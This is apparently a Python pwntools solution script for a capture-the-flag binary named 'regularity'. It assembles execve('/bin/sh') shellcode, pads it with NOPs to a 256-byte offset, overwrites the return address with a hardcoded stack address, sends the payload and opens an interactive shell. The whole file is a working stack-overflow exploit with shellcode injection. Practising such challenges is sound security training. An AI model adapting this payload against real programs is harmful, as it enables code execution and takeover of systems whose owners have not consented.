from pwn import *



context.arch = 'amd64'


context.binary = ELF = './pwn_regularity/regularity'
p = process()

gdb.attach(p,gdbscript="""
""")

shellcode = asm('''
    xor rsi, rsi
    xor rdx, rdx
    mov rdi, 0x68732f6e69622f
    push rdi
    mov rdi, rsp
    mov rax, 59
    syscall
''')
#shellcode = asm(shellcraft.sh())

print(disasm(shellcode))


offset = 256




shellcode_address = 0x7fffffffdcf8  

#ret = p64(0x000000000040104a)

payload = shellcode  
payload += asm('nop')*(offset-len(payload))

payload += p64(shellcode_address)  

with open("pay",'wb') as f:
    f.write(payload)



p.sendline(payload)


p.interactive()